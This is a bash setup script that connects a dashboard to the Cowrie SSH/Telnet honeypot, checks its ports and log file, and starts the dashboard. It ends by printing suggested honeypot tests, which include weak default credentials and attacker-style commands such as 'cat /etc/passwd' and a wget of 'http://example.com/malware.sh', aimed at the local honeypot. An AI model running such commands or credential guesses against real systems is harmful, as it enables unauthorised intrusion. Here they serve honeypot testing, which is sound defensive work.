#!/bin/bash

echo "🔗 Setting up Dashboard Integration with Cowrie..."

# Check if Cowrie is installed and running
if [ ! -d "/home/cowrie/cowrie" ]; then
    echo "❌ Cowrie not found. Please run ./install-cowrie.sh first"
    exit 1
fi

# Check if Cowrie is running
if ! sudo systemctl is-active --quiet cowrie; then
    echo "⚠️  Cowrie is not running. Starting Cowrie..."
    sudo systemctl start cowrie
    sleep 5
fi

# Set up log file path
COWRIE_LOG="/home/cowrie/cowrie/var/log/cowrie/cowrie.json"

# Create log file if it doesn't exist
if [ ! -f "$COWRIE_LOG" ]; then
    echo "📝 Creating Cowrie log file..."
    sudo -u cowrie touch "$COWRIE_LOG"
fi

# Set up environment variable
echo "🔧 Configuring environment..."
echo "COWRIE_LOG_PATH=$COWRIE_LOG" > .env.local

# Make log file readable by the dashboard
echo "🔧 Setting up log file permissions..."
sudo chmod 644 "$COWRIE_LOG"

# Check if Node.js dependencies are installed
if [ ! -d "node_modules" ]; then
    echo "📦 Installing Node.js dependencies..."
    npm install
fi

# Check ports
echo "🔍 Checking Cowrie ports..."
if netstat -ln | grep -q ":2222"; then
    echo "✅ SSH honeypot is listening on port 2222"
else
    echo "❌ SSH honeypot is not listening on port 2222"
    echo "🔧 Checking Cowrie status..."
    sudo systemctl status cowrie
fi

if netstat -ln | grep -q ":2223"; then
    echo "✅ Telnet honeypot is listening on port 2223"
else
    echo "❌ Telnet honeypot is not listening on port 2223"
fi

# Test log file access
echo "🧪 Testing log file access..."
if [ -r "$COWRIE_LOG" ]; then
    echo "✅ Log file is readable"
    echo "📊 Current log file size: $(du -h "$COWRIE_LOG" | cut -f1)"
else
    echo "❌ Cannot read log file"
    echo "🔧 Fixing permissions..."
    sudo chmod 644 "$COWRIE_LOG"
fi

echo ""
echo "✅ Dashboard integration setup complete!"
echo ""
echo "🚀 Starting the dashboard..."
npm run dev &

sleep 3

echo ""
echo "🎯 Test the honeypot with these commands:"
echo ""
echo "SSH Tests:"
echo "  ssh root@localhost -p 2222"
echo "  ssh admin@localhost -p 2222"
echo "  ssh user@localhost -p 2222"
echo ""
echo "Telnet Tests:"
echo "  telnet localhost 2223"
echo ""
echo "🔑 Try these credentials:"
echo "  Usernames: root, admin, user, guest, test"
echo "  Passwords: admin, password, 123456, root, test, qwerty"
echo ""
echo "💻 Try these commands after connecting:"
echo "  ls -la"
echo "  cat /etc/passwd"
echo "  ps aux"
echo "  uname -a"
echo "  wget http://example.com/malware.sh"
echo ""
echo "📊 Dashboard: http://localhost:3000"
echo "📝 Live logs: sudo tail -f $COWRIE_LOG"
